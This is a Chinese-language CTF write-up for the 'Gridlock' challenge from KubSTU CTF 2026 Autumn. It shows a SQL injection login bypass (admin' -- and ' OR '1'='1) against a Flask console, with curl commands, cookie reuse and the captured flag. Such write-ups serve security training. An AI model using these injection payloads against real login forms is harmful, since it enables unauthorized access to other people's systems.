# Gridlock

> **类别:** Beginner / PPC · **赛事:** KubSTU CTF 2026 Autumn
> 作者团队: mpei_larpers · 来源: https://ctftime.org/writeup/41132 (CTFtime 社区题解)

## 📌 题目

http://159.194.244.226:8081/ — 跑在 gunicorn/Flask 上的 "GRIDLOCK" 操作员控制台。一个登录表单，需要"以 admin 身份"登入。

## 🏁 解题过程

根本不用爆破密码：在 `/login` 处理函数里，数据库查询是用字符串拼接的，所以两个字段都可注入。一个普通的注释绕过：

```bash
curl -i -c jar.txt -d "username=admin' --&password=x" \
     http://159.194.244.226:8081/login
# 302 Location: /console + Flask 会话 cookie
```

`--` 把查询的剩余部分注释掉，密码校验随之失效，服务器返回了 users 表的第一行——也就是 admin（uid=1, role=admin）。cookie 解码后是 `{"role":"admin","uid":1,"username":"admin"}`。之后我只需带着这个 cookie 打开控制台：

```bash
curl -b jar.txt http://159.194.244.226:8081/console
# ... kubstu{gr1dl0ck_4dm1n_byp4ss_a59c3848}
```

一些小细节：`admin' #` 不起作用——在 SQLite 里 `#` 不是注释；在密码字段里 `' OR '1'='1` 能生效。这个服务没有别的线索：`/admin`、`/api`、`/.git/HEAD` 都是 404，`?lang=` 没有有意思的东西，响应时间也很平稳。

**Flag:** `kubstu{gr1dl0ck_4dm1n_byp4ss_a59c3848}`
